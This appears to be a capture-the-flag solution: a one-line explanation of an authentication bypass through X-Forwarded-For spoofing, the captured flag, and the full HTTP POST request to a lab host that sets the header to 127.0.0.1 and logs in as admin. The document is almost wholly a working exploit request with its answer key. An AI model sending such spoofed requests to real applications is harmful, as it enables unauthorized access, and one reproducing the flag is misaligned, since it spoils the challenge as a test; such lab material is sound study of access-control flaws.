# Authentication bypass via X-Forwarded-For header spoofing. App checks client IP for internal network access restriction but trusts the X-Forwarded-For header. Set it to 127.0.0.1 to bypass login. Flag: flag{0860966c-999f-4fbb-8072-0187ae47abec}

POST /index.php HTTP/1.1
Host: 172.17.0.1:44553
Content-Type: application/x-www-form-urlencoded
X-Forwarded-For: 127.0.0.1
Content-Length: 29

username=admin&password=admin